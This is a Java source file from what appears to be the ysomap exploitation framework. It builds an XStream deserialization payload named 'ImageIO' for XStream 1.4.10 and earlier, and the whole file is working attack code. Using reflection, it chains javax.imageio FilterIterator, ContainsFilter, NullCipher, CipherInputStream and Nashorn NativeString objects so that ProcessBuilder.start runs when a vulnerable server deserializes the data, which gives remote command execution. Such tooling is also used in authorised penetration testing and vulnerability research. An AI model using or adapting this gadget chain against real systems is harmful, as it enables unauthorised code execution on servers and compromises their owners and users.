package ysomap.payloads.xstream;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.bullets.jdk.ProcessBuilderBullet;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NullCipher;
import javax.imageio.spi.ServiceRegistry;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.Iterator;

/**
 * @author wh1t3P1g
 * @since 2020/4/15
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.XSTREAM })
@Dependencies({"<=com.thoughtworks.xstream:xstream:1.4.10"})
@Require(bullets = {"ProcessBuilderBullet","JdbcRowSetImplBullet"}, param = false)
public class ImageIO extends XStreamPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ProcessBuilderBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String action = bullet.get("action");
        if(action == null){
            action = "start";// 默认为ProcessBuilder的start函数
        }
        Class<?> clazz = obj.getClass();
        Method method = clazz.getMethod(action);
        ServiceRegistry.Filter filter =
                (ServiceRegistry.Filter) ReflectionHelper.newInstance(
                        "javax.imageio.ImageIO$ContainsFilter",
                        new Class<?>[]{Method.class, String.class},
                        new Object[]{ method, "foo"});
        Iterator it = makeFilterIterator(
                makeFilterIterator(Collections.emptyIterator(), obj, null),
                "foo",
                filter
        );

        return makeIteratorTriggerNative(it);
    }

    public static Iterator makeFilterIterator(Object iterator, Object first, Object filter) throws Exception {
        Iterator it = (Iterator) ReflectionHelper
                .createWithoutConstructor("javax.imageio.spi.FilterIterator");
        ReflectionHelper.setFieldValue(it, "iter", iterator);
        ReflectionHelper.setFieldValue(it, "next", first);
        ReflectionHelper.setFieldValue(it, "filter", filter);
        return it;
    }

    public static Object makeIteratorTriggerNative( Object it ) throws Exception {
        Cipher m = ReflectionHelper.createWithoutConstructor(NullCipher.class);
        ReflectionHelper.setFieldValue(m, "serviceIterator", it);
        ReflectionHelper.setFieldValue(m, "lock", new Object());

        InputStream cos = new CipherInputStream(null, m);

        Class<?> niCl = Class.forName("java.lang.ProcessBuilder$NullInputStream"); //$NON-NLS-1$
        Constructor<?> niCons = niCl.getDeclaredConstructor();
        niCons.setAccessible(true);

        ReflectionHelper.setFieldValue(cos, "input", niCons.newInstance());
        ReflectionHelper.setFieldValue(cos, "ibuffer", new byte[0]);

        Object b64Data = ReflectionHelper
                .createWithoutConstructor("com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data");
        DataSource ds = (DataSource) ReflectionHelper
                .createWithoutConstructor("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"); //$NON-NLS-1$
        ReflectionHelper.setFieldValue(ds, "is", cos);
        ReflectionHelper.setFieldValue(b64Data, "dataHandler", new DataHandler(ds));
        ReflectionHelper.setFieldValue(b64Data, "data", null);

        Object nativeString = ReflectionHelper
                .createWithoutConstructor("jdk.nashorn.internal.objects.NativeString");
        ReflectionHelper.setFieldValue(nativeString, "value", b64Data);
        return PayloadHelper.makeMap(nativeString, nativeString);
    }
}
